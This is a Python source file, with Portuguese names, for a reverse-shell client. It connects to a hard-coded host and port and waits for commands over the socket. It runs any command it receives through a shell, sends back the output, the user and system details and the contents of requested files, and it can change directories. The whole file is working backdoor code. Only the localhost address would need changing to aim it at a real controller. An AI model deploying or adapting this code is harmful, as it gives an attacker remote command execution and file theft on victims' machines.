import os
import socket
import platform
import subprocess
from colorama import Fore, Back, Style, init
init()

class Cor:

    def __init__(self):
        self.sucesso     = Style.BRIGHT + Back.GREEN + Fore.WHITE
        self.aviso       = Style.BRIGHT + Back.YELLOW + Fore.BLACK
        self.erro        = Style.BRIGHT + Back.RED + Fore.WHITE
        self.inputs      = Style.BRIGHT + Back.CYAN + Fore.WHITE
        self.pagina      = Style.BRIGHT + Back.WHITE + Fore.BLACK
        self.epty        = Style.BRIGHT + Back.WHITE + Fore.BLACK

        self.verde       = Style.BRIGHT + Fore.GREEN
        self.amarelo     = Style.BRIGHT + Fore.YELLOW
        self.vermelho    = Style.BRIGHT + Fore.RED
        self.magenta     = Style.BRIGHT + Fore.MAGENTA

        self.reset       = Style.RESET_ALL

    def Sucesso(self, texto):
        return print(self.sucesso + texto + self.reset)

    def Aviso(self, texto):
        return print(self.aviso + texto + self.reset)

    def Erro(self, texto):
        return print(self.erro + texto + self.reset)

    def Inputs(self, texto):
        return print(self.inputs + texto + self.reset)

    def Mensagem(self, tipo, texto):
        if tipo == 0:
            return print(self.sucesso + '[+]' + self.reset, texto)
        elif tipo == 1:
            return print(self.aviso + '[!]' + self.reset, texto)
        elif tipo == 2:
            return print(self.erro + '[ ): ]' + self.reset, texto)
        elif tipo == 3:
            return print(self.inputs + '[->]' + self.reset, texto)


class Plataforma:

    def __init__(self):
        self.Utilizador     = str(os.getlogin())
        self.Nome_PC        = str(platform.node())
        self.Sistema        = str(platform.system())
        self.OS_Ver         = str(platform.release())
        self.OS_Full_Ver    = str(platform.platform())
        self.Arquitetura    = str(platform.architecture())
        self.Maquina        = str(platform.machine())
        self.CPU_           = str(os.cpu_count())
        self.CPU_Num        = str(os.cpu_count())

    def Mostrar_Info(self):
        return "\nUtilizador: "+self.Utilizador+"\nNome do PC: "+self.Nome_PC+"\nSistema Operativo: "+self.Sistema+" "+self.OS_Ver+"\nOS Versao: "+self.OS_Full_Ver+"\nArquitetura: "+self.Arquitetura+"\nMaquina: "+self.Maquina+"\nProcessador: "+self.CPU_+" "+self.CPU_Num+" Cores"


class SUBSHELL:

    def Executar(self, modo, comando):

        sub_proccess    = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        
        raw_output      = sub_proccess.stdout.read() + sub_proccess.stderr.read()
        str_output      = str(raw_output,'latin-1')

        if modo == 0:
            S.SOCKET.send(str.encode(str_output+'\n '))
        elif modo == 1:
            S.SOCKET.send(str.encode(str_output+'\n '))
            print(str_output)
        else:
            Texto.Mensagem(1,'MODO 0 OR 1')


class Cliente_SOCKET:

    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __init__(self):
        self.InternetProtocol   = '127.0.0.1'
        self.Porta              = 9999

    def Preparar_Conection(self):
        try:
            self.SOCKET.connect((self.InternetProtocol, self.Porta))
            Texto
        except ConnectionRefusedError:
            Texto.Mensagem(2,'Timeout')
        else:
            Texto.Mensagem(0,'Conetado (:')

    def Comandos(self):
        while True:

            pacotes_rcv=self.SOCKET.recv(1024).decode('utf-8')

            if 'sair' in pacotes_rcv:
                Texto.Mensagem(1,'A Encerrar')
                self.SOCKET.close()
                break

            elif 'limpar' in pacotes_rcv:
                os.system('cls')

            elif 'infocliente' in pacotes_rcv:
                self.SOCKET.send(str.encode(Plat.Mostrar_Info()))

            elif 'chdir' in pacotes_rcv:
                diretorio=pacotes_rcv[6:]

                try:
                    os.chdir(diretorio)
                except FileExistsError:
                    self.SOCKET.send(str.encode('DIR_NA'))
                except NotADirectoryError:
                    self.SOCKET.send(str.encode('NOT_DIR'))
                except OSError:
                    self.SOCKET.send(str.encode('OS_ERR'))
                else:
                    self.SOCKET.send(str.encode(os.getcwd()))

            elif 'file' in pacotes_rcv:
                ficheiro_nome=pacotes_rcv[5:]

                try:
                    ficheiro=open(ficheiro_nome,'r')
                except FileNotFoundError:
                    self.SOCKET.send(str.encode('FILE_NF'))
                except PermissionError:
                    self.SOCKET.send(str.encode('NOT_FILE'))
                except IsADirectoryError:
                    self.SOCKET.send(str.encode('NOT_FILE'))
                else:
                    ficheiro_dados=ficheiro.read()
                    ficheiro.close()
                    S.SOCKET.send(str.encode(ficheiro_dados))

            else:
                Shell.Executar(1,pacotes_rcv)


Texto=Cor()
Plat=Plataforma()
S=Cliente_SOCKET()
Shell=SUBSHELL()

def main():
    S.Preparar_Conection()
    S.Comandos()

main()


        